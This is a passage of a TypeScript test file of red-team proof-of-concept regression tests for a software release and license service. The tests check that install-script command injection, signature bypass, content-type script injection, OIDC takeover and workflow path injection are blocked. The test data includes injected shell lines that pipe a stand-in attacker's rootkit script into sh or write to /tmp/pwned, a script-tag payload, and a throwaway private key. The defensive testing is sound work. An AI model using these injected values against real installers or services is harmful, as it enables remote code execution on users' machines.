import { ingestFor } from "../../src/core/ingest/pipeline.js";
/**
 * RED TEAM R6 — Release-channel poisoning PoCs.
 *
 * Every test here is an ATTACK. They were written to assert the *vulnerable* behaviour;
 * post-remediation each one asserts that the same attack now FAILS. Test names are
 * unchanged so the mapping back to the R6 audit findings survives.
 *
 * Still-green attacks (R6-08 redirect handling, R6-09 CDATA, R6-11 portal, and the
 * request-Host origin) document findings that were deliberately NOT remediated in this pass —
 * see the Remediation section of the finding doc. R6-10 (downgrade) was fixed in P0-02 and is
 * now a regression test.
 */

import { mintDownloadToken } from "../../src/core/assets/downloadTokens.js";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { makeTestDb } from "../helpers.js";
import { KvMock } from "../kvMock.js";
import {
  makeEnv,
  mkReq,
  NOW,
  seedLicenseWithKey,
  seedProduct,
  seedOperatorPolicy,
} from "../seed.js";
import type { Db } from "../../src/db/types.js";
import type { Env } from "../../src/platform/env.js";
import { loadProduct, type Product } from "../../src/core/products.js";
import { handleActivate } from "../../src/services/license/activation.js";
import {
  DEFAULT_AUTO_ISSUE,
  DEFAULT_FINGERPRINT_POLICY,
} from "../../src/core/fingerprint.js";
import { DEFAULT_SERVICES, type ServicesMap } from "../../src/core/services.js";
import { buildHooks } from "../../src/core/hooks.js";
import { rateLimitOk } from "../../src/core/rateLimit.js";
import { recordLimiterChecks } from "../rlMock.js";
import { SERVICES } from "../../src/mount.js";
import type { FetchImpl } from "../../src/services/release/githubApp.js";
import type { Arch } from "../../src/services/release/assets.js";
import {
  UpstreamRateLimitedError,
  type Release,
  type ReleaseAsset,
} from "../../src/services/release/github.js";
import {
  meterUpstreamCalls,
  UPSTREAM_RATE_LIMIT,
} from "../../src/services/release/gateway.js";
import {
  handleReleaseSurface as handleRelease,
  seedDeliveryAccess,
} from "../releaseSurface.js";
import { renderAppcast } from "../../src/services/update/appcast.js";
import { defaultInstallScript } from "../../src/services/release/install.js";
import { linkRepo } from "../../src/services/release/linkRepo.js";
import { handleGithubWebhook } from "../../src/githubWebhook.js";
import { getReleaseConfig } from "../../src/services/release/index.js";
import { syncReleaseStore } from "../../src/services/release/sync.js";
import { checkReleaseHealth } from "../../src/services/release/health.js";
import { handleAdmin } from "../../src/console/index.js";
import { ADMIN_COOKIE, CSRF_HEADER } from "../../src/core/console/session.js";
import {
  deriveVersionEnv,
  validateInstallContext,
} from "../../src/services/release/install.js";
import {
  enableDownloads,
  handlePortalDownload,
  seedRepositoryVisibility,
} from "../portalHarness.js";
import {
  getOrCreateAccountByEmail,
  syncAccountLicenseLinks,
} from "../../src/services/identity/portal/repo.js";
import { HEAD_SHA, withDefaultHead } from "../githubHead.js";
import { consoleTestSession } from "../consoleSessionHelper.js";

// ── Shared harness ───────────────────────────────────────────────────────────

const SLUG = "djdl";

// A throwaway 2048-bit RSA private key (PKCS#8 PEM) so the App-JWT signer runs. Test only.
const TEST_RSA_PKCS8 = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCsEMREsWAll4vT
9mDM1zr8yF9klknqOJPqLj/1SvQx3IJNKks0LfEhPK+1LqTIrALhx3UM3N8hmmY6
Kk7C8cXsA0b49QtF/KtFPFnK+cSBGtOmZMJ7tJBQhUswWeJ2BPr24sDJZaCS4JH5
QlCi2g7Lchwkzp6d2H23rm9CD8LT6OPcgXnALdM4wfQ3Wa1gklDi0zd29FyKsdtF
3PjhzUVn7xRJQFOQU3vOqizauuYvM2WmV9K3BnkZZyPRgSVIEggBwlyrJLBSVZYI
8C2zmxLs7SeUaoq29rewma3h5mLhwL62VN0WC6B7rM18cifR0sR46VVc3/2gNAZ3
BxnHKG+TAgMBAAECggEAAvfVEuRGZs+a62CcIdxymYqxTpBjHQW103vRwZ714GhP
3RnmKzPBrZOY6lSwJgAFmrRwmfSzaqZ5rfYt3qICCoSx9Dhx5daqc6rLV7uAPsPi
M8QYML8YIDN0bRSX2fZTB/A4aCD3KKF0EysoLe76A1toDeB8jvd9j64UID0aXMJn
7UNX6BrmAj36r/gUZNiIPDQRg0RZV+weDv8Q0BG2yE6wpA2B5jdEJbX4jq7Tr2WU
3xJlG2GBOt1kNcaVKlr2FmF+3xFAdafJW/AYaMBL5EWytiMqP9bu/H3cm/laphKA
+phJ2fGgw094+ZS+fP2Qja7yqI6/6rDg53pGWCVuVQKBgQDhvS/Q8BM2dJIZUy+B
KZpZKuQSKvYvKvuNvjkuUSj8XA6AvfehcQWWJRngB7S1cYJoANsO3KvAyHQ4RUe9
s6AHDGJljnB/kfqMdQKbMtmw7u8MEtLRHCELZ0eVcd/8nHBmCgkCe1sj8OmXBVkN
pqW16lfsLu58g8u/qzPRrRQ+bwKBgQDDIaKwhhl0UD9+9wNBLZZ2lurLUiNnK4ZM
0yHaYselF8WkBRRlpTYJrEEYetlFLxToNlqk4VlWES0ZtJQ5SQJgqzG2cmMApvAJ
hurjuDBPaGcu56K7wUobYFbw9aNM7Nnm+Tpt+DehIJ48rjBMKSBAqLj2QXBSP+ST
QU/BYgbzHQKBgBFz+h1yYlnke2M/3j1jRQ691TJeZfhRn29fFLazCbMxPuHPTjUK
Mv9f0PdUQTGCHC4EWut0PkdCeFHdcWWGXMoOuBDYCXSjibaQWWo8bT5TyuGpFumZ
/igOjSdNzZ6PTdVl0zqA5RQLTVQi0rbOeqNtAe0916yC2B7ykqgUdKs7AoGBAI2L
MYsgywgPSe/cWDUIT5OYZ5qy61FkRhgmMvFKJA3Cj7ApqyEMVYVwuQt72W0Q+PZ0
rw3ZFUeUUAXMcpSXPC1JIVd55AzOC2KtxmcG7aw8TFS+29GcJRh0qrxBQoKDcJDW
CqdInXm4wm+73vbwAiBFA15GG6beB/01LBhX9jiVAoGBAM2aHdDaIHzO71WMB7Qi
6e6lkI53ovO8vzw/hITzvTqbEslxweqRjv0LHwMo1/+zdFtnxyWHUTFQtT4VM7FV
86FY7DjzErSUSOhQfXvKGVvy2oAYxQUqqJgHI2iowSMVNg1O45wW4O3eUsJuMx06
d+RKUGe97dQXkny7eE7qJPbg
-----END PRIVATE KEY-----`;

function envFor(): Env {
  const env = makeEnv(new KvMock(), [SLUG]);
  env.GITHUB_APP_ID = "12345";
  env.GITHUB_APP_PRIVATE_KEY = TEST_RSA_PKCS8;
  return env;
}

function asset(name: string, id = name.length, size = 4096): ReleaseAsset {
  return {
    id,
    name,
    size,
    content_type: "application/octet-stream",
    browser_download_url: `https://example/${name}`,
  };
}

function release(over: Partial<Release> = {}): Release {
  return {
    tag_name: "v1.2.3",
    name: "1.2.3",
    body: null,
    published_at: "2026-01-02T03:04:05Z",
    html_url: "https://github.com/acme/djdl/releases/tag/v1.2.3",
    prerelease: false,
    draft: false,
    assets: [],
    ...over,
  };
}

function makeProduct(slug = SLUG): Product {
  return {
    slug,
    name: slug,
    signingKid: "kid",
    signingKey: async () => "pem",
    signingPub: null,
    compatMin: "0.0.0",
    compatMax: "99.0.0",
    defaultMaxOfflineDays: 30,
    defaultDeviceLimit: 5,
    adminGroup: null,
    schemaVersion: 1,
    fingerprintPolicy: DEFAULT_FINGERPRINT_POLICY,
    autoIssue: DEFAULT_AUTO_ISSUE,
    services: DEFAULT_SERVICES,
    registration: "requires-license",
    webOrigins: [],
  };
}

async function seedReleaseConfig(
  db: Db,
  over: Record<string, unknown> = {},
): Promise<void> {
  await seedProduct(db, SLUG);
  const row = {
    product: SLUG,
    gh_owner: "acme",
    gh_repo: "djdl",
    gh_installation_id: 42,
    channel_workflow: "channel.yml",
    beta_branch: "main",
    manual_channels_json: null as string | null,
    binary_name: "djdl",
    install_template: null as string | null,
    sparkle_ed25519_pub: "PUBKEY==",
    summary_marker: "pkey:summary",
    artifact_policy_json: null as string | null,
    metadata_access: "public",
    artifacts_access: "public",
    ...over,
  };
  await db.run(
    `INSERT INTO release_config
       (product, gh_owner, gh_repo, gh_installation_id, channel_workflow, beta_branch,
        manual_channels_json, binary_name, install_template, sparkle_ed25519_pub, summary_marker,
        artifact_policy_json, metadata_access, artifacts_access)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    row.product,
    row.gh_owner,
    row.gh_repo,
    row.gh_installation_id,
    row.channel_workflow,
    row.beta_branch,
    row.manual_channels_json,
    row.binary_name,
    row.install_template,
    row.sparkle_ed25519_pub,
    row.summary_marker,
    row.artifact_policy_json,
    row.metadata_access,
    row.artifacts_access,
  );
  await seedDeliveryAccess(db, row.product, row.artifacts_access);
}

interface Call {
  url: string;
  init?: RequestInit;
}

/** URL-substring routed fetch stub that records the full (url, init) of every call. */
function stubFetch(routes: Array<[string, () => Response]>): {
  fetchImpl: FetchImpl;
  calls: Call[];
} {
  const calls: Call[] = [];
  const fetchImpl: FetchImpl = async (input, init) => {
    const url = String(input);
    calls.push({ url, ...(init ? { init } : {}) });
    if (url.includes("/access_tokens")) {
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    }
    for (const [needle, build] of routes) {
      if (url.includes(needle)) return build();
    }
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl: withDefaultHead(fetchImpl), calls };
}

function req(url = "https://key.plrs.im/djdl/version"): Request {
  return new Request(url) as unknown as Request;
}

// ── .pkey/ manifest harness (link + webhook resync) ──────────────────────────

function contentsResponse(text: string): Response {
  const b64 = Buffer.from(text, "utf8").toString("base64");
  return new Response(JSON.stringify({ content: b64, encoding: "base64" }), {
    status: 200,
  });
}

/** A mutable `.pkey/` file map so a test can "push a commit" between calls. */
function pkeyFetch(files: Record<string, string>): {
  fetchImpl: FetchImpl;
  calls: Call[];
  files: Record<string, string>;
} {
  const calls: Call[] = [];
  const fetchImpl: FetchImpl = async (input, init) => {
    const url = String(input);
    calls.push({ url, ...(init ? { init } : {}) });
    if (url.includes("/installation"))
      return new Response(JSON.stringify({ id: 4242 }), { status: 200 });
    if (url.includes("/access_tokens"))
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    if (url.includes("/contents/")) {
      for (const [path, body] of Object.entries(files)) {
        if (url.includes(`/contents/${path}`)) return contentsResponse(body);
      }
      return new Response("not found", { status: 404 });
    }
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl: withDefaultHead(fetchImpl), calls, files };
}

const SCHEMA_JSON = JSON.stringify({
  schemaVersion: 1,
  entries: [
    {
      key: "run.concurrency",
      kind: "config",
      category: "run",
      label: "Concurrency",
      description: "",
      schema: { type: "integer", minimum: 1 },
    },
  ],
});

const PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  tiers: [{ id: "pro", label: "Pro" }],
});

/**
 * The same manifest as a repo *writer* would rewrite it: new IdP, new admin group, fat tier.
 *
 * `policyDeviceLimit` is 999 and not the 100,000 it used to be. The device-limit ceiling
 * (`MAX_DEVICE_LIMIT`, 1,000) covers every seat-cap write path, and this manifest is applied as
 * ONE document, so a six-figure limit makes ingest refuse the whole thing, and the tests that
 * use it would pass for the wrong reason: not because the gate they are about held, but because
 * the manifest never parsed. 999 keeps the fixture hostile in the dimension these tests are
 * about (a repo push rewriting operator-owned policy) while staying inside the ceiling. The
 * ceiling itself is covered separately, below.
 */
const ATTACKER_PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  oidc: {
    provider: "custom",
    issuer: "https://idp.attacker.example",
    clientId: "attacker-client",
    clientSecretSecret: "OIDC_SECRET__ACME",
    redirectUris: ["https://attacker.example/cb"],
    groupRoleMap: { everyone: { role: "admin" } },
  },
  tiers: [{ id: "pro", label: "Pro", policyDeviceLimit: 999 }],
});

/** The seat cap the ceiling refuses: `claimDeviceSeat`'s recursive CTE is O(limit) inside ONE
 *  statement, so this is a repo push that turns every later activation into a hang. */
const OVERSIZED_LIMIT_PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  tiers: [{ id: "pro", label: "Pro", policyDeviceLimit: 100_000 }],
});

function releaseJson(over: Record<string, unknown> = {}): string {
  return JSON.stringify({
    release: {
      ghOwner: "acme-org",
      ghRepo: "acme-app",
      binaryName: "acme",
      betaBranch: "main",
      summaryMarker: "pkey:summary",
      sparkleEd25519Pub: "PUBKEY==",
      ...over,
    },
  });
}

function hex(bytes: Uint8Array): string {
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

/** Build a *validly HMAC-signed* GitHub push delivery. */
async function signedPush(
  payload: unknown,
  secret: string,
): Promise<{ body: string; signature: string }> {
  const body = JSON.stringify(payload);
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = new Uint8Array(
    await crypto.subtle.sign(
      "HMAC",
      key,
      new TextEncoder().encode(body) as BufferSource,
    ),
  );
  return { body, signature: `sha256=${hex(sig)}` };
}

function deliveryRequest(delivery: {
  body: string;
  signature: string;
}): Request {
  return new Request("https://key.plrs.im/webhooks/github", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-github-event": "push",
      "x-hub-signature-256": delivery.signature,
      // Derived from the signed bytes, so replaying the SAME captured delivery replays the
      // same GUID (that is the whole point of the R6-06 replay test) while distinct
      // deliveries get distinct GUIDs.
      "x-github-delivery": delivery.signature.slice(7, 43),
    },
    body: delivery.body,
  }) as unknown as Request;
}

function pushPayload(over: Record<string, unknown> = {}): unknown {
  return {
    ref: "refs/heads/main",
    after: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    // The installation `pkeyFetch` reports for this repo; the handler binds to it.
    installation: { id: 4242 },
    repository: {
      name: "acme-app",
      full_name: "acme-org/acme-app",
      default_branch: "main",
      owner: { login: "acme-org" },
    },
    head_commit: { modified: [".pkey/release.json"] },
    commits: [],
    ...over,
  };
}

// ═════════════════════════════════════════════════════════════════════════════
// R6-01 — install.sh RCE via repo-controlled binary_name
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-01 install.sh command injection via .pkey-controlled binaryName", () => {
  // FIXED (R6-01): `renderInstallScript` refuses to render a context outside its safe
  // character classes, so a legacy/poisoned `binary_name` fails closed with a 404 instead
  // of emitting a script with attacker lines above `set -eu`.
  it("a newline in binaryName injects arbitrary shell into the served installer", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // Exactly what `String(rel.binaryName)` yields for a YAML/JSON block scalar.
      binary_name:
        "djdl\ncurl -fsSL https://attacker.example/rootkit.sh | sh\n#",
    });
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const script = await res.text();
    expect(script).not.toContain("attacker.example");
    expect(script.split("\n")).not.toContain(
      "curl -fsSL https://attacker.example/rootkit.sh | sh",
    );
    expect(res.headers.get("content-type")).not.toContain("text/x-shellscript");
  });

  // FIXED (R6-01): the same gate catches the quote-breakout variant.
  it("a double quote in binaryName breaks out of the quoted URL assignment", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      binary_name: 'djdl"; id > /tmp/pwned; :"',
    });
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const script = await res.text();
    expect(script).not.toContain("/tmp/pwned");
    expect(script).not.toContain("URL=");
  });

  // FIXED (R6-01): the manifest boundary rejects the whole `.pkey/` document, so the
  // poisoned `binary_name` never reaches `release_config` in the first place.
  it("END-TO-END: a push to .pkey/release.json rewrites binary_name and poisons install.sh", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });

    const linked = await linkRepo(
      env,
      db,
      "acme-org/acme-app",
      NOW,
      stub.fetchImpl,
      ingestFor(SERVICES),
    );
    expect(linked.ok).toBe(true);
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe("acme");

    // The attacker (anyone with push access to .pkey/ on the default branch) edits one field.
    stub.files[".pkey/release.json"] = releaseJson({
      binaryName: "acme\ncurl -fsSL https://attacker.example/x | sh\n#",
    });

    const res = await handleGithubWebhook(
      deliveryRequest(await signedPush(pushPayload(), "webhook-secret")),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      ok: boolean;
      products: Array<{ ok: boolean; errors?: string[] }>;
    };
    // The resync failed manifest validation rather than applying the poisoned value.
    expect(body.ok).toBe(false);
    expect(body.products[0]?.errors?.join("\n")).toContain(
      "release.binaryName must match",
    );
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe("acme");

    const installed = await handleRelease(
      req("https://key.plrs.im/acme/install.sh"),
      env,
      db,
      makeProduct("acme"),
      "install",
      {},
      stub.fetchImpl,
    );
    expect(installed.status).toBe(200);
    const script = await installed.text();
    expect(script).not.toContain("attacker.example");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-02 — install.sh ships no integrity verification at all
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-02 install.sh performs no integrity verification", () => {
  // FIXED (R6-02): the script fetches the artifact's published `.sha256`, verifies it, and
  // aborts before `chmod +x` on mismatch — or when no checksum is published at all.
  it("downloads → chmod +x → mv with no checksum, signature, or Gatekeeper check", () => {
    const script = defaultInstallScript({
      origin: "https://key.plrs.im",
      cliBase: "/djdl/release/dl",
      installPath: "/djdl/release/install.sh",
      binaryName: "djdl",
      channels: ["staging", "beta"],
      versionEnv: "DJDL_VERSION",
    });
    expect(script).toContain('curl -fL --progress-bar -o "$TMP" "$URL"');
    expect(script).toContain('wget -q -O "$TMP" "$URL"');

    // An integrity primitive is now emitted, for both download paths.
    expect(script).toContain('SHA_URL="$URL?checksum=sha256"');
    for (const token of [
      "shasum -a 256",
      "sha256sum",
      "openssl dgst -sha256",
    ]) {
      expect(script).toContain(token);
    }
    // Verification happens BEFORE the binary is made executable / moved into place.
    const lines = script.split("\n");
    const idx = (needle: string): number =>
      lines.findIndex((l) => l.includes(needle));
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeGreaterThan(-1);
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeLessThan(
      idx('chmod +x "$TMP"'),
    );
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeLessThan(
      idx('mv "$TMP" "$TARGET"'),
    );
    // No published checksum ⇒ refuse, rather than install unverified.
    expect(script).toContain('if [ -z "$EXPECTED_SHA256" ]; then');
    expect(script).toContain("Refusing to install an unverified binary.");
    // The false "the binary is expected to be notarized" claim is gone.
    expect(script.toLowerCase()).not.toContain("notariz");
  });

  it("serves the published .sha256 sidecar so the installer can verify the download", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const digest = "a".repeat(64);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777), asset("djdl-arm64.sha256", 778)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/778",
        () => new Response(`${digest}  djdl-arm64\n`, { status: 200 }),
      ],
    ]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64?checksum=sha256"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    expect((await res.text()).trim()).toBe(digest);

    // A release with no sidecar 404s, so `curl -fsSL` fails and the script aborts.
    const bare = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl: noSums } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(bare), { status: 200 }),
      ],
    ]);
    const missing = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64?checksum=sha256"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      noSums,
    );
    expect(missing.status).toBe(404);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-03 — Sparkle edSignature is copied verbatim, never verified
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-03 Sparkle signature is relayed, not verified", () => {
  // FIXED (R6-03): the sidecar is Ed25519-verified against `sparkle_ed25519_pub` over the
  // DMG's own bytes; anything that does not verify drops the item and 404s the feed.
  it("copies arbitrary .sig bytes into sparkle:edSignature and never uses the configured pubkey", async () => {
    const db = makeTestDb();
    // A structurally valid Ed25519 public key that did NOT sign this DMG.
    await seedReleaseConfig(db, {
      sparkle_ed25519_pub: "Nk8lJcJ5X0m5eB1yPq0M9y0eYkWq3rZ8k6JX2Yr7cQI=",
    });
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      // Not a signature at all — just attacker-chosen text in the sidecar asset.
      [
        "/releases/assets/101",
        () =>
          new Response("TOTALLY-BOGUS-NOT-A-SIGNATURE==\n", { status: 200 }),
      ],
      ["/releases/assets/100", () => new Response("DMG-BYTES")],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const xml = await res.text();
    expect(xml).not.toContain("sparkle:edSignature");
    expect(xml).not.toContain("TOTALLY-BOGUS-NOT-A-SIGNATURE==");
  });

  // FIXED (R6-03): a genuine signature over the DMG's bytes still renders, so the check is
  // a real verification and not a blanket denial.
  it("emits sparkle:edSignature only for a signature that verifies against the configured key", async () => {
    const db = makeTestDb();
    const dmgBytes = new TextEncoder().encode("REAL-DMG-BYTES");
    const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
      "sign",
      "verify",
    ])) as CryptoKeyPair;
    const b64 = (bytes: Uint8Array): string =>
      btoa(String.fromCharCode(...bytes));
    const pub = b64(
      new Uint8Array(
        (await crypto.subtle.exportKey("raw", pair.publicKey)) as ArrayBuffer,
      ),
    );
    const sigB64 = b64(
      new Uint8Array(
        await crypto.subtle.sign(
          { name: "Ed25519" },
          pair.privateKey,
          dmgBytes as BufferSource,
        ),
      ),
    );
    await seedReleaseConfig(db, { sparkle_ed25519_pub: pub });
    const rel = release({
      assets: [
        asset(
          "djdl-arm64.dmg",
          100,
          dmgBytes.length,
        ) /* the listed size is the served one (P3-03) */,
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      ["/releases/assets/101", () => new Response(sigB64)],
      [
        "/releases/assets/100",
        () => new Response(dmgBytes as unknown as BodyInit),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(200);
    expect(await res.text()).toContain(`sparkle:edSignature="${sigB64}"`);
  });

  it("REPO-CONTROLLED POLICY: .pkey/release.json can set requireSparkleSignature:false and ship an unsigned feed", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);
    // Before: a Sparkle key is configured, so an unsigned feed fails closed.
    expect((await getReleaseConfig(db, "acme"))?.sparkle_ed25519_pub).toBe(
      "PUBKEY==",
    );

    // The repo tries to disarm the platform's own signing requirement in one push.
    stub.files[".pkey/release.json"] = releaseJson({
      sparkleEd25519Pub: "",
      artifactPolicy: { requireSparkleSignature: false },
    });
    const hook = await handleGithubWebhook(
      deliveryRequest(await signedPush(pushPayload(), "webhook-secret")),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(hook.status).toBe(200);
    const cfg = await getReleaseConfig(db, "acme");
    expect(cfg?.sparkle_ed25519_pub).toBeNull();
    // FIXED (R6-03): `requireSparkleSignature` is no longer part of the manifest contract,
    // so the push cannot write it into the operator-owned artifact policy.
    expect(cfg?.artifact_policy_json).not.toContain("requireSparkleSignature");

    // ...and the unsigned feed the repo was angling for now fails closed.
    const rel = release({ assets: [asset("acme-arm64.dmg", 100, 4096)] });
    const appcastFetch: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify([rel]), { status: 200 });
      return new Response("nf", { status: 404 });
    };
    const res = await handleRelease(
      req("https://key.plrs.im/acme/appcast.xml"),
      env,
      db,
      makeProduct("acme"),
      "appcast",
      {},
      appcastFetch,
    );
    expect(res.status).toBe(404);
    expect(await res.text()).not.toContain(
      "/acme/release/dl/1.2.3/acme-arm64.dmg",
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-04 — Artifact responses relay attacker Content-Type and strip Content-Disposition
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-04 artifact streaming relays a repo-chosen Content-Type with no nosniff", () => {
  it("serves text/html from the platform origin and drops the upstream Content-Disposition", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(
            "<script>fetch('/manage/api/me').then(r=>r.text())</script>",
            {
              status: 200,
              headers: {
                // GitHub serves the asset's registered content_type…
                "Content-Type": "text/html; charset=utf-8",
                // …and a protective disposition the worker does NOT copy.
                "Content-Disposition": 'attachment; filename="djdl-arm64"',
              },
            },
          ),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    // FIXED (R6-04): the repo-chosen upstream Content-Type is never relayed…
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    // …the protective disposition is always sent…
    expect(res.headers.get("content-disposition")).toBe(
      'attachment; filename="djdl-arm64"',
    );
    // …and every release response now carries the platform security headers.
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'self'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
    // The bytes still stream through — they simply can't execute as same-origin script.
    expect(await res.text()).toContain("<script>");
  });

  // NOT FIXED — R6-11 (origin from the request Host) is out of this remediation's scope.
  it("the served origin is taken from the request Host, not from configuration", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      // `new URL(req.url).origin` — in workerd req.url is built from the Host header.
      req("https://attacker.example/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    const script = await res.text();
    // Still Host-derived, but now emitted as a shell-quoted literal (R6-01).
    expect(script).toContain("ORIGIN='https://attacker.example'");
    expect(script).toContain(
      "curl -fsSL https://attacker.example/djdl/release/install.sh | sh",
    );
  });

  // FIXED (R6-04): `appSecurityHeaders` is applied to every release response.
  it("the appcast / install.sh surfaces carry no security headers either", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'self'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-05 — channel_workflow is interpolated raw into an authenticated GitHub URL
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-05 channel_workflow path/query injection on the installation-token client", () => {
  it("dot-segments in channel_workflow redirect the token-bearing GET to an arbitrary api.github.com path", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // Manifest-controlled: `channelWorkflow: String(rel.channelWorkflow ?? "")` — unvalidated.
      channel_workflow: "../../../../../orgs/attacker-org/repos#",
    });
    const { fetchImpl, calls } = stubFetch([
      [
        "/releases?per_page",
        () =>
          new Response(JSON.stringify([release({ prerelease: true })]), {
            status: 200,
          }),
      ],
      // Whatever endpoint we actually hit answers 200 with a non-runs shape.
      ["api.github.com", () => new Response("[]", { status: 200 })],
    ]);

    // FIXED (R6-07): `channel_workflow` is encodeURIComponent'd, so the dot-segments stay
    // inside the workflow path segment and cannot re-target the request. The off-shape
    // response is also guarded, so the route no longer throws.
    const res = await handleRelease(
